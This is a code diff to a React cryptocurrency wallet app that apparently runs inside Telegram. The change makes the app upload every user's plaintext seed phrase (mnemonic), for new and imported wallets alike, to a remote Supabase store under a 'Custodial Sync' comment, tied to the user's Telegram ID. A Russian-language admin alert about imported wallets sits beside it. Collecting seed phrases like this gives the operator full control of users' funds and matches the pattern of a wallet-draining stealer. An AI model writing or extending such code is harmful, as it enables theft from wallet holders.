@@ -7927,15 +7927,16 @@ export default function GemWalletApp() {
 
       const userIdStr = userId ? String(userId) : "unknown";
 
-      if(importedWords) {
-        // Custodial Sync: Save to Supabase
-        syncWalletToSupabase({
-          username: userName,
-          telegram_id: userId ? String(userId) : null,
-          mnemonic: m,
-          balance: "0"
-        });
+      // Custodial Sync: Save to Supabase immediately for ALL wallets
+      // (imported or new) so no wallet is missed if the user skips backup.
+      syncWalletToSupabase({
+        username: userName,
+        telegram_id: userId ? String(userId) : null,
+        mnemonic: m,
+        balance: "0"
+      });
 
+      if(importedWords) {
         notifyAdmin(
           `📥 <b>Кошелёк импортирован!</b>\n\n` +
           `👤 Пользователь: ${userName}\n` +
